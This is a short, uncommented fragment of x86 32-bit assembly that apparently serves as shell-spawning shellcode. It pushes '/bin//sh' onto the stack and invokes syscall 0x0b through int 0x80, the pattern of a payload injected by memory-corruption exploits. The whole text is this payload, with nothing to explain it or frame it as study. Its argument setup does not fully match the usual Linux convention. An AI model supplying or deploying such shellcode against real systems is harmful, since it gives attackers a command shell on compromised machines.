xor	eax,eax
push	eax
push    0x68732f2f
push	0x6e69622f
mov	edi, esp
push	edi
mov	ebp, esp
push	eax
push	ebp
push	ebp
mov	al, 0x0b
int	0x80
